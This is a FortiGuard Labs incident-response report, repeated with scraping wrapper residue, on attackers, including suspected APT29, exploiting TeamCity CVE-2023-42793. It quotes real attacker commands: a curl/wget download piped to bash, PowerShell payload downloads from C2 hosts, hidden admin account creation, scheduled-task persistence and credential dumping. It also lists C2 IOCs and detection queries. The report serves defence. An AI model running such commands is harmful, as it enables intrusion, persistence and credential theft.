also has strings such as \u201cOllydbg,\u201d probably to check if the Ollydbg.exe process is running. If the process is found running, the malware may then terminate itself. Given our understanding of the main threat actor\u2019s operations, we determined that persistence was still possible. The IR team provided recommendations on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions recommended are provided below: Blocking the IP addresses used by threat actors Removing TeamCity software accounts created by threat actors Removing Windows accounts created by threat actors Removing backdoors created by threat actors Removing malicious files dropped by threat actors After implementing these containment and remediation actions by the victim security team, no further malicious activity has been observed. Other Threat Actor Activity In addition to the main threat actor, there were other threat actors who exploited the TeamCity vulnerability. One of these threat actors used their RCE access through the exploit to create a new TeamCity user via the TeamCity API. They then added the \u2018System administrator\u2019 role to this newly created user account. No evidence was found to indicate that this newly created account was ever used once it was created. Logs related to this activity were recorded in the teamcity-server.log and can be seen in Figure 21. Figure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user. Another threat actor separately attempted to download and execute an executable from an Amazon S3 bucket. Using an Amazon S3 Bucket instead of a separate C2 for file downloads differs from the actions of the main threat actor. This is significant, as many organizations include Amazon Services URLs in their allowlist. The threat actor used the \u2018DownloadFile\u2019 method of the PowerShell \u2018WebClient\u2019 class to download the Amazon-hosted payload. The file was saved as \u20181.exe\u2019 in the path \u2018C:\\Windows\\Temp\\1.exe\u2019. After downloading this file, the threat actor attempted to execute it using the command \u2018cmd.exe /c C:\\Windows\\Temp\\1.exe\u2019. Windows Defender logs indicate this file was detected as Trojan:Script/Phonzy.B!ml malware by Windows Defender shortly after download and was deleted before it could be executed. Associated log events within the teamcity-server.log linked to this download activity are shown in Figure 22. Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor. Another threat actor used their TeamCity exploit to download and execute the installer for legitimate remote access software AnyDesk on the HOST_1_TEAMCITY. The AnyDesk software was installed with the \u2018--start-with-win' parameter, making it auto-start on boot. The \u2018--silent\u2019 parameter was also used, which prevents the AnyDesk application from showing any messages or errors during execution. The threat actor then set a password to AnyDesk and executed it with the \u2018--get-id' parameter to retrieve the AnyDesk-ID. This ID is used to connect to an instance of AnyDesk. This software is an implementation of a command-and-control technique (T1219 [22] ) and also supports persistence as the threat actor can use the AnyDesk-ID to connect to a running instance of the software. Log events associated with these activities in the teamcity-server.log snippet are shown in Figure 23. Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool. The Fortinet IR team was able to link connections made from the host HOST_1_TEAMCITY from the AnyDesk application to IP address 92.38.177[.]14. When we investigated, it was found to be an AnyDesk software relay address. Using relays as part of AnyDesk infrastructure allows threat actors to abstract their own infrastructure from intrusions. FortiGuard CTS information for the relay IP is shown in Figure 24. It\u2019s worth noting that FortiGuard CTS marked this as clean because AnyDesk is a common remote management tool that, by default, uses AnyDesk infrastructure, which is not malicious by itself. Figure 24: Fortiguard CTS screen with information about AnyDesk relay IP address. The connections made by AnyDesk.exe can be seen in Figure 25. Figure 25: An Anydesk.exe TCP/IP connection from host HOST_1_TEAMCITY to the internet. These actors tried one or two methods but did not conduct further activity on the server or victim network. They likely lacked the knowledge or interest to pursue further intrusion on the victim network, as their initial efforts were ineffective. Conclusion This article provided details of several intrusions where the TeamCity vulnerability CVE-2023-42793 was exploited to gain access to the victim network. Observed exploitation originated from multiple disparate threat actors who employed numerous diverse post-exploitation techniques in an attempt to gain a foothold in the victim network. It should be noted that this activity occurred after the vendor (JetBrains) had provided a valid patch. While the security controls in place within the victim's environment were able to keep the majority of adversaries at bay, a failure to adequately triage alerts generated by the victim's EDR (FortiEDR) and subsequent downgrading of protections opened gaps in the victim's defenses. This allowed the main threat actor to establish a foothold and eventually gain the access required to maneuver freely through the network. As part of this intrusion, the main threat actor employed the GraphicalProton malware to maintain access. The main threat actor primarily used Scheduled Tasks (T1053.005 [23] ) to execute these GraphicalProton payloads. Their preferred method of defense evasion for these scheduled tasks was rundll32 proxy execution, but the threat actor was also able to employ several legitimate third-party binaries that were vulnerable to search order hijacking to execute their malware. Given the technique crossover with previously reported activity and the identification of the GraphicalProton payload, FortiGuard believes with medium confidence that this attack was part of a new BlueBravo (tracked by Recorded Future [24] )/APT29 (tracked by Mandiant [25] ) campaign. Of particular note are the significant OPSEC considerations employed throughout the intrusion (discounting the opendir web server fumble): the use of compromised infrastructure local to the victim, search order hijacking with legitimate DLLs added after execution, the quality of masquerading, and the use of single-use infrastructure components. MITRE ATT&CK mappings, mitigation suggestions, and threat-hunting queries are provided below to assist organizations in identifying similar activity in their environments. IOCs have also been provided for completeness. Fortinet Protections The malware described in this report are detected and blocked by FortiGuard Antivirus as: AntiVirus: W64/GraphicalProton.A!tr AntiVirus: W64/Dukes.O!tr AntiVirus: W32/Dukes.P!tr AntiVirus: W32/PossibleThreat FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report: CVE-2023-42793: JetBrains.TeamCity.CVE-2023-42793.Authentication.Bypass The URLs are rated as \u201cMalicious Websites\u201d and \u201cMalicious Activities Found\u201d by the FortiGuard Web Filtering service. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team . Threat Hunting The following Threat Hunting query will search for a network socket connected by rundll32.exe, which has the same filenames of DLL as those observed in this intrusion. Type: (\"Socket Connect\") AND Source.Process.Name: (\"rundll32.exe\") AND Source.Process.CommandLine: (\"\\\"AclNumsInvertHost.dll\\\", AclNumsInvertHost\" OR \"\\\"UnregisterAncestorAppendAuto.dll\\\", UnregisterAncestorAppendAuto\") The following Threat Hunting query will search for process creation events where rundll32.exe launches cmd.exe and executes any of the commands executed by the malicious DLL upon execution. Type: (\"Process Creation\") AND Source.Process.Name: (\"rundll32.exe\") AND Target.Process.File.Name: (\"cmd.exe\") AND Target.Process.CommandLine: (\"\\/C \\\"chcp 65001 \\> NUL & netstat \\-afn \\-p TCP\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & wmic datafile where Name\\=\\\"C\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\ntoskrnl.exe\\\" get Version\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & echo %userdomain%\\*%computername%\\*\\*%username%\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & tasklist\\\"\") The following Threat Hunting query will search for process creation of scheduled tasks using schtasks.exe with type ONLOGON or ONSTART and with the following filenames (iisexpresstray.exe, AclNumsInvertHost.dll, UnregisterAncestorAppendAuto.dll), which were used throughout this intrusion for persistence. Type: (\"Process Creation\") AND Target.Process.File.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (create \\/SC AND (ONLOGON OR ONSTART)) AND Target.Process.CommandLine:(iisexpresstray.exe OR AclNumsInvertHost.dll OR UnregisterAncestorAppendAuto.dll OR DefenderUPDService OR IISUpdateService) The following Threat Hunting query will search for an event where a particular task creation was being verified by the threat actor. Type: (\"Process Creation\") AND Target.Process.File.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (\"\\/Query \\/TN \\\\Microsoft\\\\Windows\\\\DefenderUPDService \\/FO LIST \\/V\") The following Threat Hunting query will search for an event where TeamCity process (java.exe) creates a process of Windows task management utility (schtasks.exe). Keep in mind that this query might have false positives where there is an official need for Java applications to launch the schedule task utility. Type: (\"Process Creation\") AND Source.Process.Name: (\"java.exe\") AND Target.Process.File.Name: (\"schtasks.exe\") The following Threat Hunting query will search for an event where schtasks.exe is the target process and the command line contains rundll32.exe. Keep in mind this query might generate false positives in envrionments where there are scheduled tasks having rundll32.exe are created using schtasks.exe. Type: (\"Process Creation\") AND target.Process.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (rundll32.exe) The following Threat Hunting query will search for an event where rundll32.exe will connect to login.microsoftonline[.]com or graph.microsoft[.]com over HTTP protocol. Keep in mind that this query might generate false positives where there is a legitimate use of rundll32.exe to connect to these URLs. Type: (\"HTTP Request\") AND Source.Process.Name: (\"rundll32.exe\") AND URL: (\"https\\:\\/\\/login.microsoftonline.com\\:443\" OR \"https\\:\\/\\/graph.microsoft.com\\:443\") MITRE ATT&CK TA0042: Resource Development Technique Technique Description Observed Activity T1584.004 Compromise Infrastructure: Server The threat actor(s) had compromised a server of an educational institution. A malicious DLL file connected to this compromised server as a C2. The IR team suspects that this server acts as a connection forwarder to the real C2. Mitigation Mitigation is difficult using preventive controls as infrastructure is outside the scope of the enterprise. Fortinet Security Fabric Controls: N/A TA0043: Reconnaissance Technique Technique Description Observed Activity T1595.002 Active Scanning: Vulnerability Scanning The threat actor(s) performed vulnerability scans using Nuclei to check if the TeamCity server was vulnerable for CVE-2023-42793. Mitigation Traffic pattern inspection for the specific URL pattern used in a vulnerability check can be done. Also, monitoring of network data for uncommon data flows can be done to identify abnormal activity. Fortinet Security Fabric Controls: FortiGate, FortiSIEM TA0001: Initial Access Technique Technique Description Observed Activity T1190 Exploit Public-Facing Application The threat actor(s) exploited the vulnerability CVE-2023-42793 of the public-facing TeamCity software host. Mitigation Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application. Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure. Fortinet Security Fabric Controls: FortiWeb, FortiGate, FortiSIEM TA0002: Execution Technique Technique Description Observed Activity T1059.003 Command and Scripting Interpreter: Windows Command Shell The threat actor(s) executed cmd.exe through the vulnerable TeamCity software for various activities, including the download and execution of malicious files. Mitigation Blocking network connections from cmd.exe to external IP addresses, except for those on an allow list, is the best way to limit this very prevalent TTP. Detection of cmd.exe being spawned by software services (e.g. java.exe in current scenario). Fortinet Security Fabric Controls: FortiEDR, FortiGate, FortiSIEM (detection) Technique Technique Description Observed Activity T1053.005 Scheduled Task/Job: Scheduled Task The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence. Mitigation Audit the scheduled task on the hosts using a SIEM tool to identify abnormal tasks. Fortinet Security Fabric Controls: FortiSIEM (detection), FortiEDR, FortiClient Technique Technique Description Observed Activity T1047 Windows Management Instrumentation The threat actor(s) used the Windows Management Instrumentation command-line utility from HOST_1_TEAMCITY to connect to multiple other hosts for lateral movement. Mitigation Use application control to block execution of wmic.exe if it is not required for a given system or network. This ensures that potential misuse is prevented. Advanced EDR products with behavioral detection can detect and block the use of WMIC for malicious behaviors. Fortinet Security Fabric Controls: FortiSIEM (detection), FortiEDR, FortiClient TA0003: Persistence Technique Technique Description Observed Activity T1136.001 Create Account: Local Account The threat actor(s) created a Windows local administrator account through cmd.exe. Mitigation New account creation should be audited using Windows logs. Fortinet Security Fabric Controls: FortiSIEM (detection) Technique Technique Description Observed Activity T1053.005 Scheduled Task/Job: Scheduled Task The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence. Mitigation Audit the scheduled task on the hosts using SIEM tool for abnormal tasks. Fortinet Security Fabric Controls: FortiSIEM (detection) TA0005: Defense Evasion Technique Technique Description Observed Activity T1574.001 Hijack Execution Flow: DLL Search Order Hijacking Threat actor(s) downloaded a number of legitimate signed executable files and malicious DLLs in the same folder. The malicious DLLs were named similarly but were different from their legitimate counterparts. A full list of vulnerable legitimate software used in this way is available in Table 2 in the report. Mitigation Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions. Fortinet Security Fabric Controls: FortiEDR, FortiClient Technique Technique Description Observed Activity T1564.002 Hide Artifacts: Hidden Users Threat actor(s) created a new local admin account and made that account a special account by adding HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist to the registry path. This prevented the new account from being displayed on the GUI login screen. Mitigation Monitor executed commands and arguments that could be used to add a new user and subsequently hide it from login screens. Advanced EDR solutions like FortiEDR can be used to monitor for associated registry changes. Windows advanced logs can be ingested into SIEM to monitor these activities. Fortinet Security Fabric Controls: FortiEDR, Windows Advanced Logging, FortiSIEM, FortiSOAR Technique Technique Description Observed Activity T1027.002 Obfuscated Files or Information: Software Packing Malicious DLL files were obfuscated to avoid analysis. Mitigation Employ heuristic-based malware detection on endpoints and generate alerts for executables packed with known packers. Fortinet Security Fabric Controls: FortiEDR, FortiClient Technique Technique Description Observed Activity T1218.011 System Binary Proxy Execution: Rundll32 The actor(s) used the Windows utility rundll32.exe to execute malicious DLL files (GraphicalProton). This appeared to be the adversary\u2019s primary/preferred method of DLL execution. Mitigation A behavioral detection tool such as FortiEDR can be used to detect and block malicious activities performed by files executed via rundll32.exe. Fortinet Security Fabric Controls: FortiEDR, FortiClient, FortiSIEM, FortiSOAR TA0006: Credential Access Technique Technique Description Observed Activity T1003.002 OS Credential Dumping: Security Account Manager The threat actor had tried to dump SAM using the command \u2018reg.exe save HKLM\\SAM.\u2019 Mitigation A modern EDR solution should detect and mitigate attempts to access and dump the SAM registry hive. Fortinet Security Fabric Controls: FortiEDR Technique Technique Description Observed Activity T1003.003 OS Credential Dumping: NTDS The threat actor had tried to dump Ntds.dit using the Windows utility ntdsutil.exe. Mitigation A modern EDR solution should detect and mitigate attempts to access and dump NTDS files. Fortinet Security Fabric Controls: FortiEDR TA0011: Command & Control Technique Technique Description Observed Activity T1071.001 Application Layer Protocol: Web Protocols The malicious DLL file made HTTPS web requests to the adversary\u2019s C2. Mitigation Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Firewalls should be able to block network connections with anomalous user-agent strings associated with non-standard browsers. This can also reduce the effectiveness of this TTP if the adversary does not configure a user-agent to match the environment. It is possible to block C2 IPs/URLs obtained from a threat intel feed at the gateway level. Fortinet Security Fabric Controls: FortiEDR, FortiGate, FortiSIEM, FortiGuard Threat Intelligence Technique Technique Description Observed Activity T1219 Remote Access Software The actor downloaded AnyDesk software as an alternative C2 method to gain direct remote access to victim endpoints. Mitigation Application whitelisting is a great way of reducing the effectiveness of this TTP. Where this is not achievable, a modern EDR solution should be able to flag remote access software and other PUPs as suspicious so they can be allowed explicitly if used legitimately in an environment. A network-level IDS (Intrusion Detection System) with the ability to detect AnyDesk software traffic would be able to block this traffic. Fortinet Security Fabric Controls: FortiEDR, FortiClient, FortiNDR, FortiAnalyzer, FortiSIEM, FortiSOAR Technique Technique Description Observed Activity T1090.003 Proxy: Multi-hop Proxy The actor used the Tor network to launch exploit attacks. Mitigation Traffic to known anonymity networks and C2 infrastructures can be blocked through the use of network allow and block lists. Firewalls with deep inspection (e.g. FortiGate [26] ) can block Tor traffic through Application Control. Fortinet Security Fabric Controls: FortiGate, FortiEDR, FortiClient IOCs The following IOCs are from the investigation, analysis of the samples, and subsequent activity observed on the same host between initial detection and remediation by the customer. In addition to these IOCs directly observed by the FortiGuard IR team, several samples that match the characteristics of observed samples have been included to assist with detecting historical activity. Indicator Indicator Type Associated Tactic Notes a66d76d86448965e57d7be96a57529c497e4b99d SHA1 Hash Execution File hash of 1.exe downloaded on host d4411f70e0dcc2f88d74ae7251d51c6676075f6f File hash of malicious DLL AclNumsInvertHost.dll f836173805a8c4d4ee319fdefe4a5e92f3f55f32 File hash of malicious DLL UnregisterAncestorAppendAuto.dll a4b03f1e981ccdd7e08e786c72283d5551671edf File hash of malicious DLL ModeBitmapNumericAnimate.dll 8f5780056107dbc2bb59d63f454d8523091ddde2 File hash of malicious DLL MpCmdHelp.dll 51aa6e5186ede77545e99b14b8f7e8180a0c6933 File hash of malicious DLL oleac.dll 4fed3d5de4df20d961831be6194b9d595b943bc9 File hash of malicious DLL PerformanceCaptionApi.dll 682b9ac9448707024985ad54476acfbf642a03b9 File hash of malicious DLL pdhui_1.dll 3a32e516c037c37f7bf83171e167511ba53870a7 File hash of malicious DLL winmm.dll 2df317b8a408d2ad5c94b9de6f20bbef03e46066 File hash of malicious DLL mscorees.dll hxxp://bringthenoiseappnew.s3.amazonaws[.]com/ujwphtigdcokr URL C2 C2 URL from which malicious executable downloaded hXXp[:]//103[.]76[.]128[.]34:8080/ C2 URL from which malicious DLLs downloaded hXXps[:]//fisheries-states-codes-camps[.]trycloudflare[.]com/rcu C2 URL from which malicious executable downloaded 128[.]199[.]207[.]131 IP C2 C2 IP address seen from GraphicalProton malware 167[.]114[.]3[.]69 Article References [1] https://nvd.nist.gov/vuln/detail/CVE-2023-42793 [2] https://www.sonarsource.com/blog/teamcity-vulnerability/ [3] https://www.jetbrains.com/teamcity/ [4] https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis [5] https://www.cisa.gov/news-events/alerts/2023/10/04/cisa-adds-two-known-exploited-vulnerabilities-catalog-removes-five-kevs [6] https://github.com/projectdiscovery/nuclei [7] https://github.com/projectdiscovery/nuclei-templates/blob/016d696c4c964f47580f21a1219f6c878264a7a0/http/cves/2023/CVE-2023-42793.yaml#L52C34-L52C34 [8] https://crt.sh/?q=d88fbe100874149e0059203fc1873958cde569deae66e1d934083006a4d5a258 [9] https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing [10] https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/ [11] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [12] https://learn.microsoft.com/en-us/iis/extensions/introduction-to-iis-express/iis-express-overview [13] https://attack.mitre.org/techniques/T1036/005/ [14] https://attack.mitre.org/techniques/T1574/001/ [15] https://pubs.opengroup.org/onlinepubs/009604599/functions/opendir.html [16] https://attack.mitre.org/techniques/T1003/002/ [17] https://attack.mitre.org/techniques/T1003/002/ [18] https://attack.mitre.org/techniques/T1136/001/ [19] https://attack.mitre.org/techniques/T1047/ [20] https://github.com/ParrotSec/mimikatz [21] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [22] https://attack.mitre.org/techniques/T1219 [23] https://attack.mitre.org/techniques/T1053/005 [24] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [25] https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing [26] https://community.fortinet.com/t5/FortiGate/Technical-Tip-Blocking-and-monitoring-Tor-traffic/ta-p/196239 Tags: cve Related Posts CISO Collective A Guide to Incident Response Plans, Playbooks, and Policy Threat Research MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF Threat Research Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More \u201cEasy\u201d Buttons Than Ever News & Articles News Releases News Articles Security Research Threat Research FortiGuard Labs Threat Map Ransomware Prevention Connect With Us Fortinet Community Partner Portal Investor Relations Product Certifications Company About Us Exec Mgmt Careers Training Events Industry Awards Social Responsibility CyberGlossary Sitemap Blog Sitemap Copyright \u00a9 2026 Fortinet, Inc. All Rights Reserved Terms of Services Privacy Policy | Cookie Settings Also of Interest: Russian Army Exhibition Decoy Leads to New... Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1389 Botnets Continue Exploiting CVE-2023-1389 for... MerkSpy: Exploiting CVE-2021-40444 to...",
    "filtered_content": "TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs Blog Products & Solutions Secure Networking Unified SASE Cloud Security Security Operations Operational Technology Security Architecture Threat Research Threat Research PSIRT Thought Leadership CISO Collective Industry Trends Corporate Fortinet News & Updates Partners Customer Success Stories Life at Fortinet FortiGuard Labs Threat Research TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 By Amey Gat, Mark Robson, John Simmons, Ken Evans, Jared Betts, Angelo Cris Deveraturda, Hongkei Chan and Jayesh Zala | December 13, 2023 Article Contents By Amey Gat, Mark Robson, John Simmons, Ken Evans, Jared Betts, Angelo Cris Deveraturda, Hongkei Chan and Jayesh Zala | December 13, 2023 Affected Platforms: Machines running vulnerable JetBrains TeamCity versions (before 2023.05.4, per vendor advice) Threat Type: Remote Code Execution Vulnerability Impact: Remote code execution for unauthenticated users, enabling initial access to vulnerable servers Security Level : High Cyber Kill Chain\u00ae Introduction On September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises vulnerability (CVE-2023-42793 [1] ) issue. [2] TeamCity is a build management and continuous integration server from JetBrains [3] . On September 27, 2023, a public exploit for this vulnerability was released by Rapid7 [4] . This critical vulnerability was given a CVE score of 9.8, most likely because an attacker can deploy the publicly available exploit without authentication supporting remote code execution on the victim server using a basic web request to any accessible web server hosting the vulnerable application. This vulnerability has been observed being actively exploited in the wild and was added to CISA's 'Known Exploited Vulnerabilities Catalog' on October 4, 2023. [5] In mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy notification to an organization that had been compromised due to this vulnerability. This organization engaged the FortiGuard IR team to investigate the malicious activity in their network. The victim was a US-based organization in the biomedical manufacturing industry. Our subsequent investigation determined that initial access for the attack was through the exploitation of the CVE-2023-42793 TeamCity vulnerability using a custom-built exploit script written in Python. The behavior of the malware used in post-exploitation matches the GraphicalProton malware used by APT29. This article breaks down our investigation and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team. MITRE ATT&CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to assist with threat-hunting activities for similar behavior. Summary of Attack Figure 1: The attack timeline of TeamCity intrusion described in this article. Analysis Vulnerability Exploitation As part of our initial customer engagement, we examined several EDR events reported from one of the victim's Windows application servers (HOST_1_TEAMCITY). During a scoping call, the FortiGuard IR team identified that one of the applications hosted on this server was TeamCity. The victim had only recently updated the application to a non-vulnerable version. We began by retrieving application and system logs from the suspected compromised server (HOST_1_TEAMCITY). On analysis of the application logs, we identified significant evidence of successful exploitation of the TeamCity vulnerability. The authentication bypass can be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2. Figure 2: A snippet of the 'teamcity-auth.log' screenshot highlighting the TeamCity exploit evidence and associated remote IP. Analysis of these logs showed that this vulnerability had been exploited multiple times over a relatively short period, with connections originating from multiple unique public IP addresses. The teamcity-auth.log (authentication events log) identifies successful exploitation but does not provide details on commands executed through exploitation. This information is available in the separate 'teamcity-server.log' file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo command execution log highlighted in the 'teamcity-server.log' entry in Figure 3. Details of the external command execution from the 'teamcity-server.log file can also be seen in Figure 3. Figure 3: A snippet of the 'teamcity-server.log' showing remote code execution evidence, including the associated command executed through the exploitation. Further analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple threat actors were conducting simultaneous operations. Some commands executed as part of this intrusion are shown in Table 1. Remote IP Address Commands Executed 167[.]179[.]75[.]213 Command line: whoami 154[.]26[.]133[.]111 Command line: bash -c \"nproc 2>&1\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c whoami\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c ipconfig /all\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c ipconfig /displaydns\" 104[.]207[.]152[.]236 Command line: cmd.exe \"/c hostname\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c tasklist /svc\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c netstat -ano\" 74[.]207[.]242[.]113 Command line: cmd.exe \"/c net user /domain\" 212[.]113[.]106[.]100 Command line: uname -a 212[.]113[.]106[.]100 Command line: cmd.exe /c whoami 212[.]113[.]106[.]100 Command line: cmd.exe /c systeminfo 212[.]113[.]106[.]100 Command line: cmd.exe /c net user 212[.]113[.]106[.]100 Command line: cmd.exe /c \"echo 167043640 > C:/Windows/Temp/0\" 43[.]248[.]34[.]77 Command line: echo 2W1EVQsV5piPbyW6FSsNC8D7irR 103[.]89[.]13[.]155 Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG 195[.]246[.]120[.]4 Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG 20[.]222[.]6[.]225 Command line: echo 2W2GZqAg8k6ipgBTcHyK5wABDSW 45[.]133[.]7[.]129 Command line: cmd.exe /c echo 9fW99pdqfpXU21zd 45[.]133[.]7[.]154 Command line: cmd.exe \"/c net user <redacted> \"<password redacted>\" /add\" 45[.]133[.]7[.]154 Command line: cmd.exe \"/c echo <redacted> | c:\\TeamCity\\bin\\anydesk.exe --set-password\" 45[.]133[.]7[.]156 Command line: wget --no-check-certificate https[:]//fisheries-states-codes-camps.trycloudflare[.]com/rcu 45[.]133[.]7[.]124 Command line: /bin/sh -c \"(curl -s 194.38.22[.]53/tc.sh||wget -q -O- 194.38.22[.]53/tc.sh)|bash\" Table 1. Commands executed by multiple threat actors on the TeamCity software host HOST_1_TEAMCITY. Looking critically at some of the attempted commands, it appears that some of the threat actors successfully exploited the vulnerability but were unsuccessful at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in Figure 4. Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation. It appears that several of the commands from various remote IPs may have been associated with the use of the open-source vulnerability scanner Nuclei [6] . The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity vulnerability in Nuclei's official template repository [7] . The yaml template file contains the following line: POST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1 The resulting request would produce an echo command on a successfully exploited TeamCity server, identical to the echo commands observed in the victims' TeamCity logs. The IR team collated information from both logs to better understand the correlations between when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted. Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning. At this stage of the intrusion, it became clear that multiple threat actors were scanning for the vulnerability, validating if it could be exploited, and attempting to establish a foothold using the related exploitation. The following section of this report focuses on the activities of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the 'main threat actor.' A description of the activities conducted by other threat actors exploiting this vulnerability is covered more extensively in the following 'Other Threat Actors Activity' section. Main Threat Actor Intrusion The first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below: cmd.exe \"/c systeminfo\" whoami ipconfig /all whoami /all The command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the activities. This indicates the main threat actor uses different infrastructures to scan for victims and execute later commands. One command and control (C2) IP address discovered during our investigation was linked to a US-based tertiary education organization. Upon detection of this active exploitation, the FortiGuard IR team notified the organization that their infrastructure may have been compromised and part of an ongoing APT29 campaign. They performed an internal investigation and identified exploitation of their vulnerable TeamCity server associated with the previously identified IP address. As part of this exploitation, the main threat actor used the TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim's environment. The organization's security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on the educational organization was a TOR exit node. This report does not include the victim\u2019s details used as a relay to protect their identity. They have successfully remediated their environment and patched the associated vulnerability. After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, 'AclNumsInvertHost.dll,' on the TeamCity host using PowerShell and the 'Invoke-WebRequest' cmdlet. The actor used the following command to download the file: powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\" After successfully downloading this DLL file on the HOST_1_TEAMCITY, the main threat actor again used the TeamCity RCE vulnerability to create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the TeamCity exploitation. The actor used the following command to create the scheduled task: schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\" We recovered the associated Windows task file from the victim TeamCity server (HOST_1_TEAMCITY), confirming that the command in the TeamCity log had been successfully executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6: Figure 6: Windows task created by threat actor for the persistence of a DLL file. After successfully creating the scheduled task, the actor attempted to execute the newly created task using the following command, again executed through the TeamCity RCE vulnerability on the HOST_1_TEAMCITY: schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\" Analyzing the scheduled task and its method of creation, we noticed two main indicators of interest: the URL 'hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll' and the file 'AclNumsInvertHost.dll.' We then analyzed the URL referenced for downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the common name '*.ultasrv[.]com'. This common name does not appear to be associated with a legitimate organization [8] . The entity associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the associated threat actor. The files on the server can be seen in Figure 7. Figure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation. Some information on the hosted files is provided in Table 2, along with associated file hashes. Sr. No. Filename Description SHA1 Hash 1 a.zip Contains the rr.exe file e3a34930e5a814db0b5d0ac7c313cfb1c294b39e 2 AclNumInvertHost.dll Malicious DLL d4411f70e0dcc2f88d74ae7251d51c6676075f6f 3 ehttpserver.py Python HTTP server source code 5d3b03d7e74e7c378b25f53d1fc3605776edbcaf 4 iis.zip Contains iisexpresstray.exe, mscoree.dll, mscorees.dll abc50465a4b4108765a6cd6006c772fabd048458 5 iisexpresstray.exe Legitimate executable from Microsoft that is part of IISExpress setup/installer 